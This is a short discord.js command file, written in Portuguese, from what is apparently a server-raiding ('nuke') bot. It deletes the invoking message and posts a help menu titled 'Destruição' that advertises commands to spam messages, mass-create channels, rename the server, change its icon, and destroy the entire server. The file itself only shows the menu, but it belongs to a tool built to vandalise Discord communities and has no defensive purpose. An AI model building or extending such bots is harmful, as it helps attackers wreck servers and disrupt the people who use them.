const discord = require('discord.js')
const config = require("../config.json");

prefix = config.prefix

exports.run = async (client, message) => {
    message.delete()
    let nukeEmbed = new discord.RichEmbed()
    .setColor("GREEN")
    .setTitle("Destruição - Iluysm")
    .setDescription(`≪━─━─━─━─━─━─━─◈━─━─━─━─━─━─━─≫
      ${prefix}spam <mensagem> - Spamma Mensagens
      ${prefix}createtext <nome> - Cria canais de texto
      ${prefix}changename <nome> - Troca o nome do servidor
      ${prefix}changeicon <link> - Troca Foto do servidor
      ${prefix}nucker - Destroi todo o Servidor
      `)
    .setFooter(`by dozzay`);
  message.channel.sendMessage(nukeEmbed);

}
